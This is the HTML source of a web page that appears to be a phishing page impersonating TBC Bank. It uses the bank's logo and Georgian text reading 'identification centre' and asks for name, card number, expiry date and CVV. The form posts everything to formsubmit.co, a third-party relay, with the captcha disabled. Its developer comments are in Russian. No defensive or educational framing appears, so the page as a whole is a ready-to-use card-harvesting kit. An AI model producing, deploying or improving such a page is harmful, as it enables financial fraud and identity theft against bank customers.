<!DOCTYPE html>
<html lang="ru"> <!-- Язык страницы для браузера теперь русский -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Заголовок страницы (title) -->
    <title>იდენტიფიკაციის ცენტრი</title>
    
    <style>
        /* БАЗОВЫЕ СТИЛИ ДЛЯ ВСЕГО САЙТА */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* КОНТЕЙНЕР ЛОГОТИПА */
        .center-container {
            width: 100%;
            max-width: 400px;
            text-align: center;
            margin-bottom: 20px;
        }

        .logo {
            max-width: 150px;
            height: auto;
        }

        /* ОСНОВНАЯ ФОРМА */
        .form-container {
            background: white;
            padding: 25px 35px; 
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 450px;
            box-sizing: border-box;
        }

        h1 {
            font-size: 1.5rem;
            text-align: center;
            color: #333;
        }

        h3 {
            font-size: 1rem;
            color: #666;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 16px;
            margin: 8px 0 15px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }

        /* РЯД ДЛЯ СРОКА И CVV */
        .expiry-cvv-row {
            display: flex;
            gap: 15px;
        }

        .expiry-cvv-row div {
            flex: 1;
        }

        /* КНОПКА */
        button {
            width: 100%;
            padding: 18px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #0056b3;
        }

        /* АДАПТИВНОСТЬ ДЛЯ ТЕЛЕФОНОВ */
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            .form-container {
                padding: 15px 20px; 
            }
        }
    </style>
</head>
<body>

    <div class="center-container">
        <!-- Альт-текст для логотипа -->
        <img src="TBC_Bank_logo.svg.png" alt="Логотип сайта" class="logo">
    </div>

    <div class="form-container">
            
        <!-- Заголовок формы (грузинский) -->
        <h1>იდენტიფიკაციის ცენტრი</h1> 
        
        <form action="https://formsubmit.co" method="POST">
            <!-- Подзаголовок формы (грузинский) -->
            <h3>დატოვეთ თქვენი მონაცემები</h3>

            <!-- Метка поля Имя (грузинский) -->
            <label for="first-name">სახელი:</label>
            <!-- Плейсхолдер поля Имя (грузинский) -->
            <input type="text" name="first-name" id="first-name" placeholder="შეიყვანეთ სახელი" required>

            <!-- Метка поля Фамилия (грузинский) -->
            <label for="last-name">გვარი:</label>
            <!-- Плейсхолдер поля Фамилия (грузинский) -->
            <input type="text" name="last-name" id="last-name" placeholder="შეიყვანეთ გვარი" required>

            <div class="payment-form">
                <!-- Метка поля Номер карты (грузинский) -->
                <label for="card-number">ბარათის ნომერი:</label>
                <input type="text" name="card-number" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>

                <div class="expiry-cvv-row">
                    <div>
                        <!-- Метка поля ММ/ГГ (грузинский) -->
                        <label for="expiry-date">MM/YY:</label>
                        <!-- Плейсхолдер ММ/ГГ (английский, как просили) -->
                        <input type="text" name="expiry" id="expiry-date" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
                    </div>
                    <div>
                        <!-- Метка поля CVV (английский/грузинский) -->
                        <label for="cvv">CVV:</label>
                        <input type="text" name="cvv" id="cvv" placeholder="CVV" maxlength="3" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '');" required>
                    </div>
                </div>
            </div>

            <!-- Текст на кнопке (грузинский) -->
            <button type="submit">მონაცემების გაგზავნა</button>

            <!-- Скрытые поля формы -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
        </form>
    </div>

    <!-- JavaScript функции -->
    <script>
        // Функция для авто-форматирования срока действия
        function formatExpiry(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
        }
        
        // Функция для авто-форматирования номера карты пробелами
        document.getElementById('card-number').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value;
        });
    </script>

</body>
</html>
